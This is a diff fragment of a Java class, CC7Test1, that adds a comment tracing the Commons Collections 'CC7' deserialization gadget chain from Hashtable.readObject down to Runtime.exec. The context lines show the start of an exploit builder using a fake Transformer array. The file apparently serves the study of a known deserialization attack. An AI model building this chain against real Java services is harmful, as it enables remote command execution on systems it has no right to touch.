@@ -14,6 +14,23 @@ import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
 
+/**
+ * Payload method chain:
+ *
+ *     java.util.Hashtable.readObject
+ *     java.util.Hashtable.reconstitutionPut
+ *     org.apache.commons.collections.map.AbstractMapDecorator.equals
+ *     java.util.AbstractMap.equals
+ *     org.apache.commons.collections.map.LazyMap.get
+ *     org.apache.commons.collections.functors.ChainedTransformer.transform
+ *     org.apache.commons.collections.functors.InvokerTransformer.transform
+ *     java.lang.reflect.Method.invoke
+ *     sun.reflect.DelegatingMethodAccessorImpl.invoke
+ *     sun.reflect.NativeMethodAccessorImpl.invoke
+ *     sun.reflect.NativeMethodAccessorImpl.invoke0
+ *     java.lang.Runtime.exec
+ */
+
 public class CC7Test1 {
     public static void main(String[] args) throws Exception {
         Transformer[] fake = new Transformer[]{
